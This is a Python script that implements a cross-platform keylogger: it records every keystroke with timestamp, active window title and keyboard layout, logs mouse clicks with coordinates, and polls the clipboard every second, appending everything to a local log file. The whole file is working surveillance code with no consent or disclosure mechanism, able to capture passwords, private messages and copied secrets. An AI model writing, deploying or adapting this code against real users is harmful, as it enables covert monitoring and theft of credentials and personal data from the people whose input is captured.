import platform
import subprocess
import os
from pynput import keyboard, mouse
from datetime import datetime
import pygetwindow as gw
import ctypes
import pyperclip
import time
import psutil
import threading

log_file = "advanced_key_log.txt"
last_clipboard_content = ""
clipboard_history = []

# OS-specific window and keyboard layout detection
def get_active_window():
    system_platform = platform.system()
    if system_platform == 'Windows':
        window = gw.getActiveWindow()
        if window:
            return window.title
        return "Unknown Window"
    elif system_platform == 'Linux':
        try:
            window = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], stdout=subprocess.PIPE)
            return window.stdout.decode('utf-8').strip()
        except:
            return "Unknown Window"
    else:
        return "Unsupported OS"

def get_keyboard_layout():
    system_platform = platform.system()
    if system_platform == 'Windows':
        layout_id = ctypes.windll.user32.GetKeyboardLayout(0)
        layout_hex = hex(layout_id & 0xFFFFFFFF)
        return layout_hex
    elif system_platform == 'Darwin':
        return "Keyboard layout detection not implemented for macOS"
    elif system_platform == 'Linux':
        try:
            layout = subprocess.run(['setxkbmap', '-print', '-verbose', '10'], stdout=subprocess.PIPE)
            return layout.stdout.decode('utf-8').split("layout:")[1].strip().split("\n")[0]
        except:
            return "Unknown Layout"
    else:
        return "Unsupported OS"

# Function to log keys to the file
def log_to_file(message):
    with open(log_file, "a") as f:
        f.write(message)

# Function to log keys
def on_press(key):
    try:
        layout = get_keyboard_layout()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_title = get_active_window()
        log_to_file(f"{current_time} | {window_title} | {key.char} | Layout: {layout}\n")
    except AttributeError:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_title = get_active_window()
        log_to_file(f"{current_time} | {window_title} | [{key}] | Layout: {get_keyboard_layout()}\n")

# Function to stop the key listener
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Function to log mouse clicks
def on_click(x, y, button, pressed):
    if pressed:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_title = get_active_window()
        log_to_file(f"{current_time} | {window_title} | Mouse clicked at ({x}, {y}) with {button}\n")

# Function to monitor clipboard
def monitor_clipboard():
    global last_clipboard_content
    while True:
        time.sleep(1)  # Check every second
        current_clipboard_content = pyperclip.paste()
        if current_clipboard_content != last_clipboard_content:
            last_clipboard_content = current_clipboard_content
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            window_title = get_active_window()
            log_to_file(f"{current_time} | {window_title} | Clipboard changed: {current_clipboard_content}\n")

# Start clipboard monitoring in a separate thread
import threading
clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
clipboard_thread.start()

# Create listeners for keyboard and mouse
with keyboard.Listener(on_press=on_press, on_release=on_release) as keyboard_listener, \
     mouse.Listener(on_click=on_click) as mouse_listener:
    keyboard_listener.join()
    mouse_listener.join()

